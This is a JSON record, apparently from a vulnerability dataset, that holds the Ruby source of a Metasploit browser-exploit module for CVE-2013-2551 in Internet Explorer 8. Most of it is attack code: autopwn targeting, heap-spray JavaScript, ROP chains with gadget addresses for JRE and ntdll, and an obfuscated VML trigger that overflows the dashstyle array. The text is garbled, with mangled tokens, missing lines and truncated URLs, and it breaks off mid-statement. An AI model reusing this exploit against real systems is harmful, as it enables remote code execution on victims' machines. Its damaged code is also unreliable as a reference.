{
    "text": "vul_name : Microsoft Internet Explorer COALineDashStyleArray Integer Overflow ， vul_cve : CVE-2013-2551 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : RopDb ， include Msf : Exploit : Remote : BrowserAutopwn ， autopwn_info ( { ，  : ua_name => HttpClients : IE ,  ，  : ua_minver => \"8.0\" ,  ，  : ua_maxver => \"8.0\" ,  ，  : javascript => true ,  ，  : os_name => OperatingSystems : WINDOWS ,  ，  : rank => Rank ， } )  ， super ( update_info ( info ,  ， 'Name' => \"MS13-009 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow\" ,  ， 'Description' => %q{ ， This module exploits an integer overflow vulnerability on Internet Explorer. ， The vulnerability exists in the handling of the dashstyle.array length for vml ， shapes on the vgx.dll module. This module has been tested successfully on Windows 7 ， SP1 with IE8. It uses the the JRE6 to bypass ASLR by default. In addition a target ， to use an info leak to disclose the ntdll.dll base address is provided. This target ， requires ntdll.dll v6.1.7601.17514 ( the default dll version on a fresh Windows 7 SP1 ， installation ) or ntdll.dll v6.1.7601.17725 ( version installed after apply MS12-001 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Nicolas Joly' ,  # Vulnerability discovery , PoC and analysis ， '4B5F5F4B' ,  # PoC ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-2551' ]  ,  ，  [ 'OSVDB' , '91197' ]  ,  ，  [ 'BID' , '58570' ]  ,  ，  [ 'MSB' , 'MS13-037' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'Space' => 948 ,  ， 'DisableNops' => true ,  ， 'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp , -3500 ， } ,  ， 'DefaultOptions' => ， { ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'IE 8 on Windows 7 SP1 with JRE ROP' ,  # default ， { ， 'Rop' => : jre ,  ， 'Offset' => '0x5f4' ， } ，  ]  ,  ，  # requires :  ，  #  * ntdll.dll v6.1.7601.17514 ( fresh W7SP1 installation )  ，  #  * ntdll.dll v6.1.7601.17725 ( MS12-001 )  ，  [ 'IE 8 on Windows 7 SP1 with ntdll.dll Info Leak' ,  ， { ， 'Rop' => : ntdll ,  ， 'Offset' => '0x5f4' ， } ，  ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Mar 06 2013\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptBool.new ( 'OBFUSCATE' ,  [ false , 'Enable JavaScript obfuscation' , false ]  )  ，  ]  , self.class )  ， end ， def exploit ，  @ second_stage_url = rand_text_alpha ( 10 )  ，  @ leak_param = rand_text_alpha ( 5 )  ， super ， end ，  # If the user is already specified by the user , we'll just use that ， nt = agent.scan ( /Windows NT ( \\d\\.\\d ) / ) .flatten [ 0 ]  | ' ， ie = agent.scan ( /MSIE ( \\d ) / ) .flatten [ 0 ]  | ' ， ie_name = \"IE # {ie}\" ， case nt ， when '5.1' ， os_name = 'Windows XP SP3' ， when '6.0' ， os_name = 'Windows Vista' ， when '6.1' ， os_name = 'Windows 7' ， end ， targets.each do | t |  ， print_status ( \"Target selected as :  # {t.name}\" )  ， end ， end ， end ， js_code = Rex : Text.to_unescape ( p , Rex : Arch.endian ( target.arch )  ， js_nops = Rex : Text.to_unescape ( \"\\x0c\" * 4 , Rex : Arch.endian ( target.arch )  ，  # Land the payload at 0x0c0c0c0c ，  # For IE 8 ， js = %Q |  ， var heap_obj = new heapLib.ie ( 0x20000 )  ;  ， var code = unescape ( \" # {js_code}\" )  ;  ， var nops = unescape ( \" # {js_nops}\" )  ;  ， var offset = nops.substring ( 0 ,  # {my_target [ 'Offset' ] } )  ;  ， var shellcode = offset + code + nops.substring ( 0 , 0x800-code.length-offset.length )  ;  ， var block = shellcode.substring ( 0 ,  ( 0x80000-6 ) /2 )  ;  ， heap_obj.gc (  )  ;  ， heap_obj.alloc ( block )  ;  ， } ， js = heaplib ( js , { : noobfu => true} )  ， js = : Rex : Exploitation : JSObfu.new ( js )  ， js.obfuscate ， end ， end ， def get_ntdll_rop ， case @ ntdll_version ， when \"6.1.7601.17514\" ， stack_pivot = [  ，  @ ntdll_base+0x0001578a ,  # ret # from ntdll ，  @ ntdll_base+0x000096c9 ,  # pop ebx # ret # from ntdll ，  @ ntdll_base+0x00015789 ,  # xchg eax , esp # ret from ntdll ，  ] .pack ( \"V * \" )  ， ntdll_rop = [  ，  @ ntdll_base+0x45F18 ,  # ntdll ! ZwProtectVirtualMemory ， 0x0c0c0c40 ,  # ret to shellcode ， 0xffffffff ,  # ProcessHandle ， 0x0c0c0c34 ,  # ptr to BaseAddress ， 0x0c0c0c38 ,  # ptr to NumberOfBytesToProtect ， 0x00000040 ,  # NewAccessProtection ， 0x0c0c0c3c ,  # ptr to OldAccessProtection ， 0x0c0c0c40 ,  # BaseAddress ， 0x00000400 ,  # NumberOfBytesToProtect ， 0x41414141 # OldAccessProtection ，  ] .pack ( \"V * \" )  ， when \"6.1.7601.17725\" ， stack_pivot = [  ，  @ ntdll_base+0x0001579a ,  # ret # from ntdll ，  @ ntdll_base+0x000096c9 ,  # pop ebx # ret # from ntdll ，  @ ntdll_base+0x00015799 ,  # xchg eax , esp # ret from ntdll ，  ] .pack ( \"V * \" )  ， ntdll_rop = [  ，  @ ntdll_base+0x45F18 ,  # ntdll ! ZwProtectVirtualMemory ， 0x0c0c0c40 ,  # ret to shellcode ， 0xffffffff ,  # ProcessHandle ， 0x0c0c0c34 ,  # ptr to BaseAddress ， 0x0c0c0c38 ,  # ptr to NumberOfBytesToProtect ， 0x00000040 ,  # NewAccessProtection ， 0x0c0c0c3c ,  # ptr to OldAccessProtection ， 0x0c0c0c40 ,  # BaseAddress ， 0x00000400 ,  # NumberOfBytesToProtect ， 0x41414141 # OldAccessProtection ，  ] .pack ( \"V * \" )  ， end ， end ， code = payload.encoded ，  # No rop. Just return the payload. ，  # Both ROP chains generated by mona.py - See corelan.be ， case t [ 'Rop' ]  ， when : jre ， print_status ( \"Using JRE ROP\" )  ， stack_pivot = [  ， 0x7c348b06 ,  # ret # from msvcr71 ， 0x7c341748 ,  # pop ebx # ret # from msvcr71 ， 0x7c348b05 # xchg eax , esp # ret from msvcr71 ，  ] .pack ( \"V * \" )  ， rop_payload = generate_rop_payload ( 'java' , code , {'pivot'=>stack_pivot} )  ， when : ntdll ， print_status ( \"Using ntdll ROP\" )  ， rop_payload = get_ntdll_rop + payload.encoded ， end ， end ， p = get_payload ( my_target , cli )  ， js = ie_heap_spray ( my_target , p )  ， js_trigger = %Q |  ， var rect_array = new Array (  )  ， var a = new Array (  )  ， rect_array [ i ] = document.createElement ( \"v : shape\" )  ， rect_array [ i ] .id = \"rect\" + i.toString (  )  ， document.body.appendChild ( rect_array [ i ]  )  ， } ， } ， var vml1 = document.getElementById ( \"vml1\" )  ， a [ i ] = document.getElementById ( \"rect\" + i.toString (  ) ._anchorRect ;  ， vml1.dashstyle = \"1 2 3 4\" ， } ， } ， vml1.dashstyle.array.length = 0 - 1 ;  ， vml1.dashstyle.array.item ( 6 ) = 0x0c0c0c0c ;  ， { ， delete a [ i ]  ;  ， CollectGarbage (  )  ;  ， } ， location.reload (  )  ;  ， } ， create_rects_func = \"createRects\" ， exploit_func = \"exploit\" ， js_trigger = : Rex : Exploitation : JSObfu.new ( js_trigger )  ， js_trigger.obfuscate ， create_rects_func = js_trigger.sym ( \"createRects\" )  ， exploit_func = js_trigger.sym ( \"exploit\" )  ， end ， html = %Q | ",
    "time": "2013-06-13 / 2013-06-14"
}